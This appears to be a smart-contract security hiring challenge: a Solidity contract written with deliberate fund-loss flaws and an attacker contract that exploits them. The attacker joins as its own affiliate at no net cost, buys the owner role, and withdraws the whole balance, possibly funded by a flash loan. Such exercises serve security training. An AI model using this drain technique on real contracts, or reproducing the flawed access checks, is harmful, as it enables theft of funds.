pragma solidity >=0.8.0;

// Hi dear candidate!
// Please review the following contract to find the 2 vulnerbilities that results in loss of funds.(High/Critical Severity)
// Please write a short description for each vulnerbillity you found alongside with a PoC in hardhat/foundry.
// Your PoC submission should be ready to be run without any modification
// Feel free to add additional notes regarding informational/low severity findings
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "hardhat/console.sol";

contract PonziContract is ReentrancyGuard, Ownable {


    constructor() Ownable(){
     
    }

event RegistrationDeadline(uint256 registrationDeadline);
event Withdraw(uint256 amount);

uint256 private registrationDeadline;
address[] public affiliates_;
mapping(address => bool) public affiliates;
uint256 public affiliatesCount;


modifier onlyAfilliates() {

    bool affiliate;

    for (uint256 i = 0; i < affiliatesCount; i++) {
    if (affiliates_[i] == msg.sender) {
    affiliate = true;
    }
    }
    require(affiliate == true, "Not an Affiliate!");
    _;
}
    function setDeadline(uint256 _regDeadline) external onlyOwner {
    registrationDeadline = _regDeadline;
    emit RegistrationDeadline(registrationDeadline);
    }
function joinPonzi(address[] calldata _afilliates) external payable nonReentrant {
    require(
    block.timestamp < registrationDeadline,
    "Registration not Active!"
    );
    require(_afilliates.length == affiliatesCount, "Invalid length");
    require(msg.value == affiliatesCount * 1 ether, "Insufficient Ether");
    for (uint256 i = 0; i < _afilliates.length; i++) {
    _afilliates[i].call{value: 1 ether}("");

    }
    affiliatesCount += 1;
    affiliates[msg.sender] = true;
    affiliates_.push(msg.sender);
}

function buyOwnerRole(address newAdmin) external payable onlyAfilliates {
require(msg.value == 10 ether, "Invalid Ether amount");
_transferOwnership(newAdmin);
}
function ownerWithdraw(address to, uint256 amount) external onlyOwner {
    payable(to).call{value: amount}("");
    emit Withdraw(amount);
}

function addNewAffilliate(address newAfilliate) external onlyOwner {
    affiliatesCount += 1;
    affiliates[newAfilliate] = true;
    affiliates_.push(newAfilliate);
}

receive() external payable {}
}


 interface IPonzi {


     function affiliatesCount() external returns(uint256);

     function joinPonzi(address[] calldata _afilliates) external payable;

     function buyOwnerRole(address newAdmin) external payable;

     function ownerWithdraw(address to, uint256 amount) external;
   
 }


 contract AttackerContract {
    address[]  affiliates_;
     IPonzi ip;
     constructor(address _target){
         ip = IPonzi(_target);
     }

// In order to this to work we need to assume that the owner of PonziContract has funds inside and the attacker has 10 ethers, he can easily get this amount through a flash loan
     function stealEtherandOwnerShip() external payable {
        require(msg.value ==10 ether,"Insufficient Ether");
        
        uint256 count = ip.affiliatesCount();
        for(uint256 i =0;i<count;i++){
        affiliates_.push(address(this));
        }

        
        
        //become an affiliate by calling the joinPonzi function, you can become one by practically no cost since your will be transfer back to you
        ip.joinPonzi{value: count* 1 ether}(affiliates_);

        //now that you are affiliate with practically no cost you can now purchase owner role for 10 ether, dont worry you will be able to get these ether back in the next function
        ip.buyOwnerRole{value: 10 ether}(address(this));

        //now that you have owner rights you can withdraw all the funds within the contract including the 10 ether you gave to buy ownerhship
        uint256 balance = address(ip).balance;
        ip.ownerWithdraw(address(this), balance);

        // now you have drained the whole contract with practically no cost

     }
   receive() external payable {}
 }